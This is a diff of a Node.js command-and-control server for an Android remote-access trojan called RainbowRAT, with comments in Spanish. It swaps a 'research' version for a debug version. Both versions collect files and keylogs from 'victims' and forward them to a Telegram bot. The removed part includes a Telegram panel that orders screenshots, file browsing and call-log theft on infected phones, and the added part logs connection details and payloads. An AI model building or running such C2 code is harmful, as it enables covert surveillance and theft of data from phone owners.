@@ -6,151 +6,105 @@ const multer = require('multer');
 const fs = require('fs');
 
 /**
- * SERVIDOR C2 DE INVESTIGACIÓN - PROYECTO RAINBOW
- * Basado en el análisis de n.smali, i.smali y d.smali.
- * Este servidor emula el protocolo exacto del malware analizado.
+ * SERVIDOR C2 RAINBOW - VERSIÓN DE DEPURACIÓN (DEBUG)
+ * Diseñado para capturar conexiones ofuscadas y parámetros de consulta.
  */
 
-// --- CONFIGURACIÓN ---
-let config;
+let config = { token: "", id: "" };
 try {
     config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
 } catch (e) {
-    console.error("❌ ERROR: Configura el archivo data.json con el token del bot y tu ID.");
+    console.error("❌ Error: data.json no encontrado.");
     process.exit(1);
 }
 
 const app = express();
 const server = http.createServer(app);
+
+// Configuración de Socket.io optimizada para clientes Android antiguos/ofuscados
 const io = new Server(server, {
     cors: { origin: "*" },
-    allowEIO3: true, // Compatibilidad con el motor de n.smali
-    pingInterval: 10000,
-    pingTimeout: 5000
+    allowEIO3: true, // Crucial para la versión de Socket.io en el APK
+    transports: ['websocket', 'polling'] // Permitir ambos métodos de transporte
 });
 
 const bot = new TelegramBot(config.token, { polling: true });
-const victims = new Map(); // Mapa de IDs de dispositivos conectados
-const userState = new Map(); // Estado de navegación en Telegram
+const victims = new Map();
 
 app.use(express.json());
 
-// --- RECEPCIÓN DE ARCHIVOS Y LOGS (Visto en RainbowAccessibilityService) ---
+// Log de cada petición HTTP para ver si el APK intenta conectar vía POST/GET
+app.use((req, res, next) => {
+    console.log(`[HTTP] ${req.method} ${req.url} - IP: ${req.ip}`);
+    next();
+});
 
+// Endpoints HTTP (Upload y Text)
 const upload = multer({ storage: multer.memoryStorage() });
 app.post('/upload', upload.single('file'), (req, res) => {
-    const devId = req.headers['currenttarget'] || "ID_Desconocido";
+    const devId = req.headers['currenttarget'] || "Desconocido";
     if (req.file) {
         bot.sendDocument(config.id, req.file.buffer, {
-            caption: `<b>📥 Archivo Recibido</b>\nDispositivo: <code>${devId}</code>`,
+            caption: `<b>📁 Archivo de:</b> <code>${devId}</code>`,
             parse_mode: 'HTML'
         }, { filename: req.file.originalname });
     }
-    res.status(200).send('ok');
+    res.send('ok');
 });
 
 app.post('/text', (req, res) => {
-    const devId = req.headers['currenttarget'] || "ID_Desconocido";
-    const log = req.body.text || JSON.stringify(req.body);
-    if (log && log.length > 0) {
-        bot.sendMessage(config.id, `<b>⌨️ Keylog [${devId}]:</b>\n<code>${log}</code>`, { parse_mode: 'HTML' });
-    }
-    res.status(200).send('ok');
+    const devId = req.headers['currenttarget'] || "Desconocido";
+    const text = req.body.text || JSON.stringify(req.body);
+    bot.sendMessage(config.id, `<b>⌨️ Keylog [${devId}]:</b>\n<code>${text}</code>`, { parse_mode: 'HTML' });
+    res.send('ok');
 });
 
-// --- LÓGICA DE SOCKETS (Basada en n.smali e i.smali) ---
+// --- GESTIÓN DE SOCKETS CON DEPURACIÓN ---
 
 io.on('connection', (socket) => {
+    // IMPORTANTE: El APK puede enviar los datos en la URL (query) o en Headers
+    const query = socket.handshake.query;
     const headers = socket.handshake.headers;
-    // El APK usa 'currenttarget' como ID principal según b.smali
-    const deviceId = headers['currenttarget'] || headers['model'] || socket.id;
-    const model = headers['model'] || "Android";
+    
+    console.log("[SOCKET] Intento de conexión detectado");
+    console.log("-> Query Params:", JSON.stringify(query));
+    console.log("-> Headers:", JSON.stringify(headers));
+
+    // Intentamos obtener el ID del dispositivo de múltiples fuentes
+    const deviceId = query.currenttarget || headers['currenttarget'] || query.model || headers['model'] || socket.id;
+    const model = query.model || headers['model'] || "Android Device";
 
     victims.set(deviceId, socket.id);
-    console.log(`[+] Conexión establecida: ${model} (${deviceId})`);
+    
+    console.log(`[+] Víctima Identificada: ${model} (${deviceId})`);
 
-    bot.sendMessage(config.id, `<b>📱 Dispositivo Online</b>\nModelo: ${model}\nID: <code>${deviceId}</code>`, { parse_mode: 'HTML' });
+    bot.sendMessage(config.id, `<b>✅ Dispositivo Online</b>\nModelo: ${model}\nID: <code>${deviceId}</code>\nIP: ${socket.handshake.address}`, { parse_mode: 'HTML' });
 
-    // Manejo de 'ping' para resetear el timer de reconexión de n.smali
     socket.on('ping', () => socket.emit('pong'));
 
-    // Manejo de respuestas en el canal 'data' (confirmado en i.smali)
-    socket.on('data', (payload) => {
-        const raw = typeof payload === 'object' ? JSON.stringify(payload, null, 2) : payload;
-        bot.sendMessage(config.id, `<b>📨 Respuesta de ${deviceId}:</b>\n<pre>${raw}</pre>`, { parse_mode: 'HTML' });
+    socket.on('data', (data) => {
+        console.log(`[DATA] de ${deviceId}:`, data);
+        const report = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
+        bot.sendMessage(config.id, `<b>📨 Respuesta:</b>\n<pre>${report}</pre>`, { parse_mode: 'HTML' });
     });
 
-    socket.on('disconnect', () => {
+    socket.on('disconnect', (reason) => {
+        console.log(`[-] Desconectado: ${deviceId} (Razón: ${reason})`);
         victims.delete(deviceId);
         bot.sendMessage(config.id, `<b>❌ Dispositivo Offline</b>\nID: ${deviceId}`);
     });
+
+    // Capturar cualquier evento no definido para ver si el APK usa otros nombres
+    socket.onAny((eventName, ...args) => {
+        if (eventName !== 'ping' && eventName !== 'data') {
+            console.log(`[EVENTO DESCONOCIDO] ${eventName}:`, args);
+            bot.sendMessage(config.id, `<b>🔔 Evento detectado:</b> <code>${eventName}</code>\nPayload: <pre>${JSON.stringify(args)}</pre>`, { parse_mode: 'HTML' });
+        }
+    });
 });
 
-// --- INTERFAZ DE TELEGRAM ---
-
-bot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-    if (String(chatId) !== String(config.id)) return;
-
-    const text = msg.text;
-
-    if (text === '/start' || text === '↩️ Volver') {
-        userState.delete(chatId);
-        return bot.sendMessage(chatId, `<b>✯ Panel Rainbow C2 ✯</b>\nActivos: ${victims.size}`, {
-            parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [['📱 Lista de Víctimas']],
-                resize_keyboard: true
-            }
-        });
-    }
-
-    if (text === '📱 Lista de Víctimas') {
-        const ids = Array.from(victims.keys());
-        if (ids.length === 0) return bot.sendMessage(chatId, "No hay dispositivos conectados.");
-        const kb = ids.map(id => [id]);
-        kb.push(['↩️ Volver']);
-        return bot.sendMessage(chatId, "Selecciona una ID para controlar:", { reply_markup: { keyboard: kb, resize_keyboard: true } });
-    }
-
-    // Selección de dispositivo
-    if (victims.has(text)) {
-        userState.set(chatId, { target: text });
-        const actions = [['📸 Capturar Pantalla', '📂 Ver Archivos'], ['📞 Obtener Llamadas', '↩️ Volver']];
-        return bot.sendMessage(chatId, `📍 Controlando: ${text}`, { reply_markup: { keyboard: actions, resize_keyboard: true } });
-    }
-
-    // Procesamiento de acciones
-    const state = userState.get(chatId);
-    if (state && state.target) {
-        let cmd = null;
-        switch(text) {
-            case '📸 Capturar Pantalla': cmd = 'screenshot'; break;
-            case '📂 Ver Archivos': cmd = 'file-explorer'; break;
-            case '📞 Obtener Llamadas': cmd = 'calls'; break;
-        }
-
-        if (cmd) {
-            const socketId = victims.get(state.target);
-            if (socketId) {
-                // ESTRUCTURA DE SEGURIDAD: Enviamos el comando en varios formatos
-                // por si la ofuscación de d.smali espera una clave distinta.
-                const payload = {
-                    action: cmd,
-                    type: cmd,
-                    order: cmd,
-                    request: cmd
-                };
-                io.to(socketId).emit('data', payload);
-                bot.sendMessage(chatId, `⚡ Comando <b>${cmd}</b> enviado.`, { parse_mode: 'HTML' });
-            }
-        }
-    }
-});
-
-server.listen(3000, () => {
-    console.log("---------------------------------------");
-    console.log("🚀 SERVIDOR C2 RAINBOW INICIADO");
-    console.log("Puerto: 3000 | Esperando dispositivos...");
-    console.log("---------------------------------------");
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`🚀 C2 escuchando en puerto ${PORT}`);
+    console.log(`Servidor listo para recibir conexiones de RainbowRAT`);
 });
